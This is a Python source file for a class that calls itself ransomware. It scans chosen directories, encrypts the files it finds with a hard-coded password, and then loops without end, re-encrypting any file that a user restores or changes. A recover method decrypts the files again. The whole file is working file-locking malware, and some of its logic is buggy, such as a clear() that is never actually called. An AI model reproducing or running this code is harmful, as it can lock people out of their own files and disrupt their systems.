from ..rlib import Scanner
from ..exceptions import UnknownHashCheckType

from ..utils.ende import EncrypterDecrypter
from os.path import expanduser, expandvars
from collections import defaultdict

import os, hashlib, time

class Runtime:
    def __init__(self, directories: list[str] = [os.getcwd()], types: list[str] = []):
        self.to_be_locked = directories # list of directories to search
        self.filetypes = types # list of type of files to lock
        self.hashes = defaultdict(list) # hash dict
        self.filetolock = self.__isolate__() # actual files to lock
    
    def hash(self, filepath: str, algorithm: str = "sha256", buffer: int = 8192) -> str:
        # define hash function
        func = hashlib.new(algorithm)

        # cannonicalize filepath
        filepath = expanduser(expandvars(filepath))

        # generate hash
        with open(filepath, 'rb') as ref:
            while chunk := ref.read(buffer):
                func.update(chunk)
        
        # return hash
        return func.hexdigest()
    
    def encrypt(self, filepath: str, password: str):
        # create encrypter
        encrypter = EncrypterDecrypter(['-enc', expanduser(expandvars(filepath)), password])

        # get hash before encrypting and store it
        self.hashes[expanduser(expandvars(filepath))].append(self.hash(filepath))

        # encrypt
        encrypter.analyseTask()
        encrypter.carryOutTask()

        # get hash after encrypting and store it
        self.hashes[expanduser(expandvars(filepath))].append(self.hash(filepath))

        # store hashes in a file for next time.
        # filename, say... hashes.txt lol?
    
    def ifhash(self, filepath: str, type: str ='enc') -> bool:
        # type is either 'enc' or 'dec'
        # 'enc' means check enc hash
        # 'dec' means check decrypted hash
        if type == 'enc':
            return self.hash(filepath) == self.hashes[expanduser(expandvars(filepath))][1]
        elif type == 'dec':
            return self.hash(filepath) == self.hashes[expanduser(expandvars(filepath))][0]
        else:
            raise UnknownHashCheckType("Unknown type was provided. Valid: [\'enc\', \'dec\']")
    
    def __isolate__(self) -> list[str]:
        # define a storage list
        to_lock = []

        # for each directory
        for dir in self.to_be_locked:
            dir = expanduser(expandvars(dir))
            scanner = Scanner(dir) # define a scanner object
            scanner.scan() # scan all files in the directory

            # if there are given filetypes,
            if len(self.filetypes) > 0:

                # for each file type,
                for t in self.filetypes:
                    to_lock.extend(scanner.isolate(t)) # isolate and add to storage
            else: # if there are no given filetype
                to_lock.extend(scanner.files()) # add all files to file store
        return to_lock # return file store

    def start(self, mode: str = 'normal'):
        print("Ransomware Process Started.")
        # for normal mode:
        if mode == 'normal':
            # for each file to lock, encrypt it
            for file in self.filetolock:
                self.encrypt(file, "0123456789")
                print(f"Locked: {file if len(file) <= 60 else file[-60:]}")
            
            print("Locked all targetted files and now on standby.")
            
            # once all files are locked,
            # stay on standby and keep checking hashes
            while True: # repeat indefinitely
                for file in self.filetolock:
                    file = expanduser(expandvars(file)) # expand

                    # if the hash does not match,
                    # re-encrypt it.
                    if not self.ifhash(file):
                        self.hashes[file].clear # clear the hashtable for the file.
                        self.hashes[file].append(self.hash(file)) # append the current hash
                        self.encrypt(file, "0123456789") # re-encrypt
                        self.hashes[file].append(self.hash(file)) # append the enc hash table.
                time.sleep(7)
    
    def recover(self):
        # for each file
        for file in self.filetolock:
            while True:
                try:
                    # define a decrypter
                    decrypter = EncrypterDecrypter(['-dec', expanduser(expandvars(file)), "0123456789"])

                    # decrypt
                    decrypter.analyseTask()
                    decrypter.carryOutTask()
                except Exception:
                    break